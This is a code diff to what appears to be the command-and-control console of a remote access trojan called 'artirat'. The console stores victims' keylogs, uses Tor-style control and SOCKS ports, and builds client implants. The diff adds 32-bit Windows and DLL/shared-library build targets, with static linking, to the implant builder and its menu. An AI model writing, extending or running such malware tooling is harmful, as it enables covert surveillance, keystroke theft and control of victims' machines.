@@ -17,7 +17,7 @@ BUFFER_SIZE = 16384
 CONTROL_PORT = 19051
 SOCKS_PORT = 19050
 
-KEYLOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogs")
+KEYLOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "keylogger")
 
 def save_keylog(cid: int, data_b64: str):
     os.makedirs(KEYLOG_DIR, exist_ok=True)
@@ -326,15 +326,30 @@ def build_client(target: str):
         "linux-musl": "x86_64-unknown-linux-musl",
         "linux32": "i686-unknown-linux-gnu",
         "android": "aarch64-linux-android",
+        "windows32": "i686-pc-windows-gnu",
+        "dll-windows": "x86_64-pc-windows-gnu",
+        "dll-linux": "x86_64-unknown-linux-gnu",
     }
     t = targets.get(target, target)
-    print(f"[*] Building for {t} (this may take a while)...")
+    is_dll = target.startswith("dll-")
+    print(f"[*] Building {'DLL/SO' if is_dll else 'EXE'} for {t} (this may take a while)...")
     env = os.environ.copy()
     if target == "android" or t == "aarch64-linux-android":
         env["CARGO_TARGET_AARCH64_LINUX_ANDROID_LINKER"] = "aarch64-linux-android21-clang"
+
+    # Static linking via RUSTFLAGS for standalone executables
+    rustflags = env.get("RUSTFLAGS", "")
+    if is_dll:
+        cmd = ["cargo", "build", "--release", "--lib", "--features", "shared-lib", "--target", t]
+    else:
+        rustflags = f"{rustflags} -C target-feature=+crt-static".strip()
+        cmd = ["cargo", "build", "--release", "--bin", "artirat_client", "--target", t]
+    if rustflags:
+        env["RUSTFLAGS"] = rustflags
+
     r = subprocess.run(
-        ["cargo", "build", "--release", "--target", t],
-        cwd=os.path.join(PROJECT_DIR, "artirat-client"),
+        cmd,
+        cwd=os.path.join(".", "artirat-client"),
         env=env, capture_output=True, text=True
     )
     if r.stdout:
@@ -377,7 +392,7 @@ def c2_completer(text, state, manager=None):
             candidates = [str(i) for i in ids]
             return candidates[state] if state < len(candidates) else None
         if cmd == "build":
-            candidates = ["linux", "windows", "linux-musl", "linux32"]
+            candidates = ["linux", "windows", "linux-musl", "linux32", "dll-windows", "dll-linux"]
             return candidates[state] if state < len(candidates) else None
         return None
     if cmd in CMD2 and len(parts) == 2:
@@ -387,7 +402,7 @@ def c2_completer(text, state, manager=None):
             candidates = [str(i) for i in ids if str(i).startswith(arg)]
             return candidates[state] if state < len(candidates) else None
         if cmd == "build":
-            candidates = [t for t in ("linux", "windows", "linux-musl", "linux32") if t.startswith(arg)]
+            candidates = [t for t in ("linux", "windows", "linux-musl", "linux32", "dll-windows", "dll-linux") if t.startswith(arg)]
             return candidates[state] if state < len(candidates) else None
     return None
 
@@ -453,7 +468,7 @@ def c2_menu(manager: ClientManager):
         elif cmd == "build":
             if len(parts) < 2:
                 print("Usage: build <target>")
-                print("Targets: windows, linux, linux-musl, linux32")
+                print("Targets: windows, linux, linux-musl, linux32, dll-windows, dll-linux")
                 continue
             build_client(parts[1])
         elif cmd == "multi_run":
